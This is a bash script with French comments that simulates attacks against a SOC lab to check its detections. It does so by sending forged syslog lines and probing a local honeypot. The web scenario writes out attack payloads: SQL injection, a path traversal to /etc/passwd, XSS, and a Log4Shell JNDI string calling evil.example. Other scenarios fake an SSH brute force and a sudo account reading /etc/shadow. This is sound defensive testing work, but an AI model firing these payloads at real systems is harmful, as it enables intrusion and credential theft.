#!/usr/bin/env bash
# Rejoue des attaques factices contre le SOC pour vérifier détections et alertes.
#
#   ./scripts/simulate-attack.sh                    campagne complète
#   ./scripts/simulate-attack.sh ssh                un seul scénario
#   ./scripts/simulate-attack.sh web 198.51.100.9   en choisissant l'IP attaquante
#
# Scénarios : ssh | web | scan | compte | honeypot | tout (défaut)
#
# Aucune attaque réelle n'est lancée : le script envoie des lignes de journal
# au port syslog du SOC, et de simples requêtes au pot de miel local.
set -euo pipefail

ROOT="$(cd "$(dirname "$0")/.." && pwd)"
if [[ -f "$ROOT/.env" ]]; then
  set -a; source "$ROOT/.env"; set +a
fi

SCENARIO="${1:-tout}"
ATTACKER="${2:-203.0.113.66}"
HOST="${SYSLOG_HOST:-localhost}"
PORT="${SYSLOG_PORT:-9000}"
HONEYPOT_HOST="${HONEYPOT_HOST:-localhost}"
HONEYPOT_HTTP_PORT="${HONEYPOT_HTTP_PORT:-8080}"
HONEYPOT_SSH_PORT="${HONEYPOT_SSH_PORT:-2222}"
HONEYPOT_TELNET_PORT="${HONEYPOT_TELNET_PORT:-2323}"

# Ligne syslog RFC 5424, horodatée en UTC (indépendante du fuseau de la machine)
#   line <priorité> <machine> <programme> <pid> <message>
line() {
  printf '<%s>1 %s %s %s %s - - %s\n' "$1" "$(date -u '+%Y-%m-%dT%H:%M:%SZ')" "$2" "$3" "$4" "$5"
}
send() { nc -w 2 "$HOST" "$PORT"; }
# Ligne d'accès nginx (format « combined ») relayée par syslog
access() { # <méthode> <url> <code> <agent>
  line 190 srv-web-01 nginx - \
    "$ATTACKER - - [$(LC_ALL=C date '+%d/%b/%Y:%H:%M:%S %z')] \"$1 $2 HTTP/1.1\" $3 512 \"-\" \"$4\""
}

scenario_ssh() {
  echo "→ SSH : force brute depuis $ATTACKER, puis connexion réussie en root"
  {
    for i in $(seq 1 8); do
      line 38 srv-web-01 sshd "$((4000 + i))" "Failed password for invalid user admin$i from $ATTACKER port $((50000 + i)) ssh2"
    done
    line 38 srv-web-01 sshd 4100 "Invalid user oracle from $ATTACKER port 50999"
    line 38 srv-web-01 sshd 4101 "Accepted password for root from $ATTACKER port 51000 ssh2"
    line 38 srv-web-01 sshd 4102 "Accepted publickey for euloge from 192.168.1.20 port 50022 ssh2"
  } | send
}

scenario_web() {
  echo "→ Web : scanner, injection SQL, traversée de répertoire, XSS depuis $ATTACKER"
  local ua="Mozilla/5.0 (X11; Linux x86_64)"
  {
    access GET "/" 200 "$ua"
    access GET "/login" 200 "sqlmap/1.8#stable (https://sqlmap.org)"
    access GET "/.env" 404 "$ua"
    access GET "/wp-login.php" 404 "$ua"
    access GET "/produits?id=1%27%20UNION%20SELECT%20login,mdp%20FROM%20utilisateurs--" 200 "$ua"
    access GET "/produits?id=1%20OR%201=1" 200 "$ua"
    access GET "/telecharger?fichier=..%2F..%2F..%2Fetc%2Fpasswd" 404 "$ua"
    access GET "/recherche?q=%3Cscript%3Ealert(1)%3C/script%3E" 200 "$ua"
    access GET "/?x=\${jndi:ldap://evil.example/a}" 400 "$ua"
  } | send
}

scenario_scan() {
  echo "→ Réseau : balayage de 15 ports bloqué par le pare-feu depuis $ATTACKER"
  local p
  for p in 21 22 23 25 80 110 139 143 443 445 3306 3389 5432 6379 8080; do
    line 4 srv-web-01 kernel - \
      "[UFW BLOCK] IN=eth0 OUT= MAC=02:42:ac:11:00:02 SRC=$ATTACKER DST=10.0.0.5 LEN=44 TTL=240 PROTO=TCP SPT=$((40000 + p)) DPT=$p WINDOW=1024 SYN"
  done | send
}

scenario_compte() {
  echo "→ Persistance : création d'un compte, ajout au groupe sudo, puis sudo"
  {
    line 86 srv-web-01 useradd 911 "new user: name=maintenance, UID=1001, GID=1001, home=/home/maintenance, shell=/bin/bash"
    line 86 srv-web-01 usermod 912 "add 'maintenance' to group 'sudo'"
    line 85 srv-web-01 sudo - "  mallory : user NOT in sudoers ; TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash"
    line 85 srv-web-01 sudo - "  maintenance : TTY=pts/0 ; PWD=/home/maintenance ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow"
  } | send
}

scenario_honeypot() {
  echo "→ Pot de miel : visite du faux panneau d'administration et tentatives de connexion"
  local base="http://$HONEYPOT_HOST:$HONEYPOT_HTTP_PORT"
  curl -s -o /dev/null -m 5 -A "zgrab/0.x" "$base/admin" || echo "  (pot de miel HTTP injoignable sur $base)"
  curl -s -o /dev/null -m 5 -A "Mozilla/5.0" -d "username=admin&password=admin123" "$base/login" || true
  curl -s -o /dev/null -m 5 -A "Mozilla/5.0" -d "username=root&password=toor" "$base/login" || true
  printf 'SSH-2.0-libssh2_1.10.0\r\n' | nc -w 2 "$HONEYPOT_HOST" "$HONEYPOT_SSH_PORT" >/dev/null 2>&1 || true
  printf 'root\r\n123456\r\n' | nc -w 3 "$HONEYPOT_HOST" "$HONEYPOT_TELNET_PORT" >/dev/null 2>&1 || true
}

case "$SCENARIO" in
  ssh)      scenario_ssh ;;
  web)      scenario_web ;;
  scan)     scenario_scan ;;
  compte)   scenario_compte ;;
  honeypot) scenario_honeypot ;;
  tout)     scenario_ssh; scenario_web; scenario_scan; scenario_compte; scenario_honeypot ;;
  *) echo "Scénario inconnu : $SCENARIO (ssh | web | scan | compte | honeypot | tout)" >&2; exit 1 ;;
esac

echo
echo "Terminé. Les alertes apparaissent dans le tableau de bord en moins d'une minute :"
echo "  ${OSD_URL:-http://localhost:5601}/app/dashboards#/view/soc-overview"
